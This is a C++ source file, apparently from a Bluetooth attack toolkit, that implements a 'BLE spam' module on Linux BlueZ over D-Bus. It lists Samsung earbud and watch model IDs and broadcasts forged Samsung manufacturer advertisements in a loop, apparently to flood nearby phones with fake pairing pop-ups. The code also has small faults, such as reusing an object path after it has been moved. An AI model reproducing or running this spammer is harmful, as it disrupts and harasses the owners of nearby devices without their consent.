#include "ble_spam.h"

#include <chrono>
#include <thread>
#include <sdbus-c++/AdaptorInterfaces.h>
#include <sdbus-c++/IConnection.h>

#include "../core/globals.h"

std::map<std::string, std::string> genuineBudsIds = {
        {"EE7A0C", "Fallback Buds"},
        {"9D1700", "Fallback Dots"},
        {"39EA48", "Light Purple Buds2"},
        {"A7C62C", "Bluish Silver Buds2"},
        {"850116", "Black Buds Live"},
        {"3D8F41", "Gray & Black Buds2"},
        {"3B6D02", "Bluish Chrome Buds2"},
        {"AE063C", "Gray Beige Buds2"},
        {"B8B905", "Pure White Buds"},
        {"EAAA17", "Pure White Buds2"},
        {"D30704", "Black Buds"},
        {"9DB006", "French Flag Buds"},
        {"101F1A", "Dark Purple Buds Live"},
        {"859608", "Dark Blue Buds"},
        {"8E4503", "Pink Buds"},
        {"2C6740", "White & Black Buds2"},
        {"3F6718", "Bronze Buds Live"},
        {"42C519", "Red Buds Live"},
        {"AE073A", "Black & White Buds2"},
        {"011716", "Sleek Black Buds2"},
};

const std::map<std::string, std::string> genuineWatchIds = {
        {"1A", "Fallback Watch"},
        {"01", "White Watch4 Classic 44m"},
        {"02", "Black Watch4 Classic 40m"},
        {"03", "White Watch4 Classic 40m"},
        {"04", "Black Watch4 44mm"},
        {"05", "Silver Watch4 44mm"},
        {"06", "Green Watch4 44mm"},
        {"07", "Black Watch4 40mm"},
        {"08", "White Watch4 40mm"},
        {"09", "Gold Watch4 40mm"},
        {"0A", "French Watch4"},
        {"0B", "French Watch4 Classic"},
        {"0C", "Fox Watch5 44mm"},
        {"11", "Black Watch5 44mm"},
        {"12", "Sapphire Watch5 44mm"},
        {"13", "Purpleish Watch5 40mm"},
        {"14", "Gold Watch5 40mm"},
        {"15", "Black Watch5 Pro 45mm"},
        {"16", "Gray Watch5 Pro 45mm"},
        {"17", "White Watch5 44mm"},
        {"18", "White & Black Watch5"},
        {"1B", "Black Watch6 Pink 40mm"},
        {"1C", "Gold Watch6 Gold 40mm"},
        {"1D", "Silver Watch6 Cyan 44mm"},
        {"1E", "Black Watch6 Classic 43m"},
        {"20", "Green Watch6 Classic 43m"},
    };

void startBleSpam(MessageDispatcher& msgDispatcher) {
    try {
        // Create connection to bluez LEAdvertisingManager1
        sdbus::ServiceName serviceName{"org.btmagus.blespam"};
        auto connection = sdbus::createSystemBusConnection(serviceName);

        // Create my object
        sdbus::ObjectPath myAdvPath{"/org/btmagus/blespam"};
        auto myAdvObject = sdbus::createObject(*connection, std::move(myAdvPath));

        sdbus::InterfaceName interfaceName{"org.bluez.LEAdvertisement1"};

        advertisementGenerator generator(genuineBudsIds, genuineWatchIds);

        // 1. Add the VTable
        myAdvObject->addVTable(

            // METHOD: Release (Required)
            sdbus::registerMethod("Release")
                 .implementedAs([](){
                     // Do nothing. BlueZ just told us we are stopped.
                     // Returning void automatically sends the D-Bus reply.
                 }),

            // PROPERTY: Type (Required)
            sdbus::registerProperty("Type")
                 .withGetter([](){ return "peripheral"; })
                 .withUpdateBehavior(sdbus::Flags::EMITS_CHANGE_SIGNAL),

            // PROPERTY: ServiceUUIDs (Required)
            sdbus::registerProperty("ServiceUUIDs")
                 .withGetter([](){ return std::vector<std::string>{}; })
                 .withUpdateBehavior(sdbus::Flags::EMITS_CHANGE_SIGNAL),

            // PROPERTY: ManufacturerData (Spam Payload)
            sdbus::registerProperty("ManufacturerData")
                 .withGetter([&generator, &msgDispatcher](){
                     std::map<uint16_t, std::vector<uint8_t>> manufData;

                     std::vector<uint8_t> payload = generator.getGenuineWatchAdvertisement();

                     manufData[0x0075] = payload;

                     std::string payload_str(payload.begin(), payload.end());
                     msgDispatcher.dispatchMessage(Message(Message::BleSpam,
                         std::format("Manuf data payload: {}", payload_str)));

                     return manufData;
                 })
                 .withUpdateBehavior(sdbus::Flags::EMITS_CHANGE_SIGNAL)

        ).forInterface(interfaceName);

        auto managerProxy = sdbus::createProxy(*connection, sdbus::ServiceName{"org.bluez"},
            sdbus::ObjectPath{getAdapterObjectPath()});

        managerProxy->callMethod("RegisterAdvertisement")
                    .onInterface("org.bluez.LEAdvertisingManager1")
                    .withArguments(myAdvPath, std::map<std::string, sdbus::Variant>{});

        advertisementGenerator ag;
        while (isBleSpamRunning->load()) {
            std::this_thread::sleep_for(std::chrono::milliseconds(100));
        }
        // Stoping thread here
    }
    catch(const sdbus::Error& e) {
        Message err_msg(Message::BleSpam, "[Error - BleSpam]: ");
        err_msg << e.what() << '\n';
        msgDispatcher.dispatchMessage(err_msg);
    }
}